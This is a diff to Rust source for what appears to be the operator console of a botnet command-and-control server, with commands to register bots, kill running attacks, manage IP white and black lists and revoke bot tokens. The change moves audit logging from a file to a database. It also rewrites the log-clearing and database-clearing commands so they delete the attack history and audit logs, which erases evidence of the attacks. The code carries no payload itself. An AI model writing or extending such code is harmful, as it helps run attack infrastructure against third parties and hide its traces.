@@ -84,7 +84,7 @@ pub async fn handle_regbot_command(client: &Arc<Client>, state: &Arc<AppState>, 
             
             let audit_event = AuditLog::new(client.user.username.clone(), "REGISTER_BOT".to_string(), "SUCCESS".to_string())
                 .with_target(arch);
-            let _ = log_audit_event(audit_event, &state.audit_file).await;
+            let _ = log_audit_event(audit_event, &state.pool).await;
         }
         Err(e) => {
             client.write(format!("\x1b[38;5;196m[X] Failed to register bot: {}\n\r", e).as_bytes()).await?;
@@ -106,7 +106,7 @@ pub async fn handle_killall_command(client: &Arc<Client>, state: &Arc<AppState>)
     
     let audit_event = AuditLog::new(client.user.username.clone(), "KILL_ALL_ATTACKS".to_string(), "SUCCESS".to_string())
         .with_target(format!("{} attacks", count));
-    let _ = log_audit_event(audit_event, &state.audit_file).await;
+    let _ = log_audit_event(audit_event, &state.pool).await;
     
     Ok(())
 }
@@ -214,7 +214,7 @@ pub async fn handle_restore_command(client: &Arc<Client>, state: &Arc<AppState>,
             client.write(format!("\x1b[38;5;82m[✓] System restored successfully\n\r").as_bytes()).await?;
             let audit_event = AuditLog::new(client.user.username.clone(), "RESTORE_BACKUP".to_string(), "SUCCESS".to_string())
                 .with_target(backup_name);
-            let _ = log_audit_event(audit_event, &state.audit_file).await;
+            let _ = log_audit_event(audit_event, &state.pool).await;
         } else {
             client.write(format!("\x1b[38;5;196m[X] Restore failed: {}\n\r", String::from_utf8_lossy(&output.stderr)).as_bytes()).await?;
         }
@@ -245,7 +245,7 @@ pub async fn handle_db_command(client: &Arc<Client>, state: &Arc<AppState>, part
                 client.write(format!("\x1b[38;5;82m[✓] Database backed up to {}\n\r", backup_name).as_bytes()).await?;
                 let audit_event = AuditLog::new(client.user.username.clone(), "DB_BACKUP".to_string(), "SUCCESS".to_string())
                     .with_target(backup_name);
-                let _ = log_audit_event(audit_event, &state.audit_file).await;
+                let _ = log_audit_event(audit_event, &state.pool).await;
             } else {
                 client.write(format!("\x1b[38;5;196m[X] Backup failed: {}\n\r", String::from_utf8_lossy(&output.stderr)).as_bytes()).await?;
             }
@@ -255,14 +255,17 @@ pub async fn handle_db_command(client: &Arc<Client>, state: &Arc<AppState>, part
             let confirm = client.read_line().await?.trim().to_lowercase();
             
             if confirm == "y" {
-                // Clear attack history
-                tokio::fs::write("config/attack_history.json", "[]").await?;
-                // Clear logs
-                tokio::fs::write(&state.audit_file, "").await?;
+                // Clear attack history and logs from database
+                if let Err(e) = sqlx::query("DELETE FROM attacks").execute(&state.pool).await {
+                    client.write(format!("\x1b[38;5;196m[X] Failed to clear attacks: {}\n\r", e).as_bytes()).await?;
+                }
+                if let Err(e) = sqlx::query("DELETE FROM audit_logs").execute(&state.pool).await {
+                    client.write(format!("\x1b[38;5;196m[X] Failed to clear logs: {}\n\r", e).as_bytes()).await?;
+                }
                 
                 client.write(format!("\x1b[38;5;82m[✓] Database cleared\n\r").as_bytes()).await?;
                 let audit_event = AuditLog::new(client.user.username.clone(), "DB_CLEAR".to_string(), "SUCCESS".to_string());
-                let _ = log_audit_event(audit_event, &state.audit_file).await;
+                let _ = log_audit_event(audit_event, &state.pool).await;
             } else {
                 client.write(b"\x1b[38;5;245m[*] Operation cancelled\n\r").await?;
             }
@@ -302,7 +305,7 @@ pub async fn handle_adduser_command(client: &Arc<Client>, state: &Arc<AppState>,
             client.write(format!("\x1b[38;5;82m[\u{2713}] User '{}' added successfully\n\r", username).as_bytes()).await?;
             let audit_event = AuditLog::new(client.user.username.clone(), "ADD_USER".to_string(), "SUCCESS".to_string())
                 .with_target(username.to_string());
-            let _ = log_audit_event(audit_event, &state.audit_file).await;
+            let _ = log_audit_event(audit_event, &state.pool).await;
         }
         Err(e) => {
             client.write(format!("\x1b[38;5;196m[X] Failed to add user: {}\n\r", e).as_bytes()).await?;
@@ -338,7 +341,7 @@ pub async fn handle_deluser_command(client: &Arc<Client>, state: &Arc<AppState>,
             client.write(format!("\x1b[38;5;82m[✓] User '{}' deleted successfully\n\r", username).as_bytes()).await?;
             let audit_event = AuditLog::new(client.user.username.clone(), "DELETE_USER".to_string(), "SUCCESS".to_string())
                 .with_target(username);
-            let _ = log_audit_event(audit_event, &state.audit_file).await;
+            let _ = log_audit_event(audit_event, &state.pool).await;
         }
         Err(e) => {
             client.write(format!("\x1b[38;5;196m[X] Failed to delete user: {}\n\r", e).as_bytes()).await?;
@@ -362,7 +365,7 @@ pub async fn handle_changepass_command(client: &Arc<Client>, state: &Arc<AppStat
             client.write(format!("\x1b[38;5;82m[✓] Password changed for user '{}'\n\r", username).as_bytes()).await?;
             let audit_event = AuditLog::new(client.user.username.clone(), "CHANGE_PASSWORD".to_string(), "SUCCESS".to_string())
                 .with_target(username.to_string());
-            let _ = log_audit_event(audit_event, &state.audit_file).await;
+            let _ = log_audit_event(audit_event, &state.pool).await;
         }
         Err(e) => {
             client.write(format!("\x1b[38;5;196m[X] Failed to change password: {}\n\r", e).as_bytes()).await?;
@@ -377,11 +380,14 @@ pub async fn handle_clearlogs_command(client: &Arc<Client>, state: &Arc<AppState
     let confirm = client.read_line().await?.trim().to_lowercase();
     
     if confirm == "y" {
-        tokio::fs::write(&state.audit_file, "").await?;
-        client.write(b"\x1b[38;5;82m[\xE2\x9C\x93] System logs cleared\n\r").await?;
-        
-        let audit_event = AuditLog::new(client.user.username.clone(), "CLEAR_LOGS".to_string(), "SUCCESS".to_string());
-        let _ = log_audit_event(audit_event, &state.audit_file).await;
+        if let Err(e) = sqlx::query("DELETE FROM audit_logs").execute(&state.pool).await {
+            client.write(format!("\x1b[38;5;196m[X] Failed to clear logs: {}\n\r", e).as_bytes()).await?;
+        } else {
+            client.write(b"\x1b[38;5;82m[\xE2\x9C\x93] System logs cleared\n\r").await?;
+            
+            let audit_event = AuditLog::new(client.user.username.clone(), "CLEAR_LOGS".to_string(), "SUCCESS".to_string());
+            let _ = log_audit_event(audit_event, &state.pool).await;
+        }
     } else {
         client.write(b"\x1b[38;5;245m[*] Operation cancelled\n\r").await?;
     }
@@ -431,7 +437,7 @@ pub async fn handle_userchange_command(client: &Arc<Client>, state: &Arc<AppStat
             client.write(format!("\x1b[38;5;82m[✓] User '{}' updated successfully\n\r", username).as_bytes()).await?;
             let audit_event = AuditLog::new(client.user.username.clone(), "UPDATE_USER".to_string(), "SUCCESS".to_string())
                 .with_target(format!("{} {}", username, field));
-            let _ = log_audit_event(audit_event, &state.audit_file).await;
+            let _ = log_audit_event(audit_event, &state.pool).await;
         }
         Err(e) => {
             client.write(format!("\x1b[38;5;196m[X] User '{}' not found or update failed: {}\n\r", username, e).as_bytes()).await?;
@@ -464,7 +470,7 @@ pub async fn handle_whitelist_command(client: &Arc<Client>, state: &Arc<AppState
     
     let audit_event = AuditLog::new(client.user.username.clone(), "WHITELIST_IP".to_string(), "SUCCESS".to_string())
         .with_target(ip.to_string());
-    let _ = log_audit_event(audit_event, &state.audit_file).await;
+    let _ = log_audit_event(audit_event, &state.pool).await;
     
     Ok(())
 }
@@ -492,7 +498,7 @@ pub async fn handle_blacklist_command(client: &Arc<Client>, state: &Arc<AppState
     
     let audit_event = AuditLog::new(client.user.username.clone(), "BLACKLIST_IP".to_string(), "SUCCESS".to_string())
         .with_target(ip.to_string());
-    let _ = log_audit_event(audit_event, &state.audit_file).await;
+    let _ = log_audit_event(audit_event, &state.pool).await;
     
     Ok(())
 }
@@ -563,7 +569,7 @@ pub async fn handle_config_command(client: &Arc<Client>, state: &Arc<AppState>, 
              client.write(format!("\x1b[38;5;82m[✓] Config updated: {} = {}\n\r", key, value).as_bytes()).await?;
              let audit_event = AuditLog::new(client.user.username.clone(), "UPDATE_CONFIG".to_string(), "SUCCESS".to_string())
                 .with_target(format!("{}={}", key, value));
-             let _ = log_audit_event(audit_event, &state.audit_file).await;
+             let _ = log_audit_event(audit_event, &state.pool).await;
         }
     } else {
         client.write(format!("\x1b[38;5;196m[X] Invalid value for key: {}\n\r", key).as_bytes()).await?;
@@ -615,7 +621,7 @@ pub async fn handle_revoke_command(client: &Arc<Client>, state: &Arc<AppState>, 
             client.write(format!("\x1b[38;5;82m[✓] Token revoked for bot {}\n\r", bot_id).as_bytes()).await?;
             let audit_event = AuditLog::new(client.user.username.clone(), "REVOKE_TOKEN".to_string(), "SUCCESS".to_string())
                 .with_target(bot_id.to_string());
-            let _ = log_audit_event(audit_event, &state.audit_file).await;
+            let _ = log_audit_event(audit_event, &state.pool).await;
         }
         Err(e) => {
             client.write(format!("\x1b[38;5;196m[X] Failed to revoke token: {}\n\r", e).as_bytes()).await?;
